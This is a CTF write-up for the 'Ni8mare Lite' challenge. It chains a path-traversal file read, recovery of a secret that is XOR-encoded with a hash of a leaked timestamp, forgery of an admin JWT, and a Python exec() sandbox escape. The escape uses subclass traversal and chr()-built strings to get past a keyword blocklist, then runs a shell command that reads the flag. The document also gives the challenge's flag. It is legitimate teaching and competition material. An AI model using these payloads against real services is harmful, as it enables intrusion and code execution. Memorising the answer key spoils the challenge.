# Ni8mare Lite

> Workflow automation API that chains an LFI, a weak XOR-derived session secret, JWT forgery and a Python sandbox escape.
> **Flag:** `flag{1d4a31b85c6b90e1}`

---

## Solution

Four issues stack into a clean chain.

### 1. LFI in `/api/webhooks/trigger`

The endpoint accepts a `files` array of arbitrary paths. It only checks the
extension (`.json`, `.yml`, `.db`) and never restricts the directory:

```http
POST /api/webhooks/trigger
{"workflow_id":"x","files":[{"path":"/app/.internal/config.json"}]}
```

That reads the config created by `init_app()`, which contains
`XOR_ENCODED_SECRET`.

### 2. Recover `SESSION_SECRET`

The XOR key is `sha256(BOOT_TIMESTAMP)[:len(secret)]`, and `BOOT_TIMESTAMP` is
leaked publicly by `/api/health` as `started_at`:

```bash
$ curl -s https://<instance>/api/health
{"started_at": 1783176534, ...}
```

```python
from hashlib import sha256

data = bytes.fromhex(XOR_ENCODED_SECRET)
ts   = sha256(b'1783176534').digest()
secret = bytes(a ^ b for a, b in zip(data, ts)).decode()
# d1648dcb40cb80d664dbf8a1f36fc3461649df94902e0455
```

### 3. Forge an admin JWT

```python
import jwt
token = jwt.encode({"role": "admin", "user": "attacker"},
                   secret, algorithm="HS256")
```

`/api/workflows/evaluate` only checks `role == "admin"`.

### 4. Escape the Python sandbox

The evaluator uses `exec()` with restricted `__builtins__` and blocks the word
`os` with `\bos\b`. Building the string from `chr()` avoids the filter:

```python
_x = chr(111) + chr(115)          # 'os' without typing 'os'
_subs = [].__class__.__bases__[0].__subclasses__()
for _s in _subs:
    _i = getattr(_s, "__init__", None)
    if _i and hasattr(_i, "__globals__"):
        _g = _i.__globals__
        if _x in _g:
            _o = _g[_x]
            print(str(getattr(_o, "listdir")("/")))
            break
```

This lists `/` and reveals `flag_6d127dfc0aea8d97.txt`. Reading it:

```python
print(getattr(_o, "popen")("cat /flag_6d127dfc0aea8d97.txt").read())
```

### 5. Flag

```text
flag{1d4a31b85c6b90e1}
```

## Lesson

Blocklists on a Python sandbox are not a boundary: subclass traversal reaches any
module that is already loaded. A secret derived from a public timestamp is not a
secret either.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
